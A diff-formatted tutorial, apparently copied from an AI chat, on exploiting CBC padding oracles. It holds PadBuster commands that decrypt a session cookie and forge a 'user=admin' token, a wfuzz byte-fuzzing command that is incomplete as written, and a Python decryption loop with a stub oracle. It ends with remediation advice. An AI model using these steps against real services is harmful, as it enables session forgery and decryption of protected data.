@@ -1,1 +1,96 @@
 
+🚀 Method 1: Automated Exploitation with PadBuster (Fastest)
+
+PadBuster is a dedicated perl script built explicitly to handle automated padding oracle scanning and decryption over HTTP/HTTPS requests.
+
+Step 1: Install the utility
+
+On security-oriented Linux environments, it is available out of the box. Otherwise, pull it from packages:
+bash
+sudo apt install padbuster      # Ubuntu/Debian/Kali
+Use code with caution.
+
+Step 2: Run the automated decryption engine
+
+Provide the target URL, the encrypted parameter, the block size (usually 16 for AES-128/256 or 8 for DES/3DES), and specify where the target string lives (using flags like -cookies, -headers, or -post):
+bash
+padbuster http://vulnerable-api.local "7B2J%2F6x9" 16 -cookies "session=7B2J%2F6x9"
+Use code with caution.
+The tool will issue hundreds of requests, analyze the server error pages, reverse the PKCS#7 padding bytes sequentially backwards, and print the plaintext on screen.
+
+Step 3: Forging a new payload
+
+If you want to use the oracle to encrypt a malicious string (like user=admin) instead of decrypting, add the -plaintext flag:
+bash
+padbuster http://vulnerable-api.local "7B2J%2F6x9" 16 -cookies "session=7B2J%2F6x9" -plaintext "user=admin"
+Use code with caution.
+Output: PadBuster will generate a valid hex/URL-encoded ciphertext block string that the server will successfully decrypt as "user=admin".
+
+🕵️ Method 2: Mass Web Enumeration with wfuzz
+
+If an API returns different HTTP status codes or message lengths for bad padding (e.g., 500 Internal Error vs 200 OK), you can use the command-line fuzzer wfuzz to map out or test a large volume of byte guesses.
+bash
+# Fuzz the last byte of the initialization vector/previous block to map responses
+wfuzz -z list,00-ff -u "http://vulnerable-api.local" --hc 404
+Use code with caution.
+Look for anomalies in the response payload lengths to find the single byte that yields a 200 OK or a distinct error page. This indicates a valid padding alignment (usually 0x01).
+
+🐍 Method 3: Pure Python Automation Script
+
+If you are attacking a non-HTTP socket, a custom binary, or a unique API interface, you can write a clean terminal loop to brute-force the intermediate state byte-by-byte.
+python
+import sys
+
+# 1. Configuration parameters
+BLOCK_SIZE = 16
+# Clean ciphertext split into two blocks: [Previous_Block / Target_Block]
+# Modifying bytes in c_prev alters what c_curr decrypts into.
+c_prev = bytearray.fromhex("41414141414141414141414141414141")
+c_curr = bytearray.fromhex("5b2e9c3f4a1a8d5e6c7b8a9b0c1d2e3f")
+
+decrypted_block = bytearray(BLOCK_SIZE)
+
+def send_to_oracle(payload_bytes):
+    # DUMMY INTERFACE LOOP: Replace this with your actual network request
+    # Return True if server says 'valid padding' or doesn't crash.
+    # Return False if server throws 'Padding Error' or 'Invalid PKCS7'.
+    return True
+
+print("⏳ Cracking target block backwards...")
+
+# 2. Iterate backwards from the end of the block to the beginning
+for idx in range(BLOCK_SIZE - 1, -1, -1):
+    padding_val = BLOCK_SIZE - idx
+    
+    # Clone and prepare the modified injection vector template
+    c_mod = bytearray(c_prev)
+    
+    # Adjust previously cracked trailing bytes to line up with the new target padding value
+    for k in range(idx + 1, BLOCK_SIZE):
+        c_mod[k] = c_prev[k] ^ decrypted_block[k] ^ padding_val
+        
+    # 3. Brute-force the current byte slot (256 possibilities)
+    for byte_guess in range(256):
+        c_mod[idx] = c_prev[idx] ^ byte_guess ^ padding_val
+        
+        # Test the altered structure against the live server
+        if send_to_oracle(c_mod + c_curr):
+            # Special edge case check for the first byte cracked (ensuring it's not a false 0x02)
+            if padding_val == 1:
+                c_mod[idx - 1] ^= 1
+                if not send_to_oracle(c_mod + c_curr):
+                    continue # False positive detected, resume loop
+                    
+            decrypted_block[idx] = byte_guess
+            print(f"Index [{idx:02d}] found -> Plaintext Byte: '{chr(byte_guess)}' (Hex: 0x{byte_guess:02x})")
+            break
+
+print(f"🎯 Complete Block Decrypted: {decrypted_block.decode(errors='ignore')}")
+Use code with caution.
+
+🛡️ Remediating Padding Oracles
+
+If you are reviewing source code or system configurations from your terminal to completely patch this flaw, ensure the architecture applies the Encrypt-then-MAC paradigm:
+• Implement Authenticated Encryption (AEAD): Swap out legacy CBC mode implementations entirely. Enforce modern algorithms like AES-GCM or ChaCha20-Poly1305. These modes combine encryption with an authentication tag. If an attacker modifies even a single bit of the ciphertext, the validation layer catches it instantly and rejects the entire payload before trying to parse any padding structural logic.
+• Return Uniform Error Messages: If you cannot migrate away from CBC, ensure your error paths are identical. The server should return a generic "Authentication Failed" message and identical HTTP status codes regardless of whether the decryption failure was due to an invalid padding alignment or an incorrect data structure layout.
+
